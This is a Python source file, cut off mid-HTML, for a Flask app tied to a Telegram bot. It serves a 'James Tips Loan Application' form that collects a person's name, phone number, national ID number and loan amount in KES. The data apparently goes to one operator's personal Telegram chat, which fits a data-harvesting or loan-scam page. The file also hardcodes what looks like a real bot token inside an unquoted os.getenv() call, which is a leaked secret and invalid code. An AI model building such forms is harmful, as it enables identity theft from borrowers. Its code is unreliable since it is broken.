import os
import requests
from flask import Flask, request, render_template_string
from threading import Thread
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

BOT_TOKEN = os.getenv(8922430528:AAH2AquN-GYZSvtpvrugccYw_YYEUbfqAs)
CHAT_ID = os.getenv("CHAT_ID") # your personal telegram ID - get from @userinfobot

app_flask = Flask(__name__)

FORM_HTML = """
<!DOCTYPE html>
<html>
<head><meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:sans-serif;background:#f4f6f9;padding:20px}
.card{max-width:420px;margin:30px auto;background:white;padding:25px;border-radius:12px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
input,select{width:100%;padding:13px;margin:10px 0;border:1px solid #ddd;border-radius:8px;box-sizing:border-box}
button{width:100%;padding:14px;background:#0a7a44;color:white;border:none;border-radius:8px;font-weight:bold;font-size:16px}
h2{text-align:center;color:#0a7a44}
small{color:gray}
</style>
</head>
<body>
<div class="card">
<h2>James Tips Loan Application</h2>
<form method="POST">
<input name="name" placeholder="Full Name" required>
<input name="phone" placeholder="Phone Number (07...)" required>
<input name="id" placeholder="ID Number" required>
<input name="amount" type="number" placeholder="Loan Amount (KES)" required>
<select name="duration" required>
<option value="">Select Duration</option>
<option>1 Month</option><option>3 Months</option><option>6 Months</option><option>12 Months</option>
</select>
<input name="purpose" placeholder="Loan Purpose">
<button type="submit">Submit Application</button>
<br><br><small>We never ask for M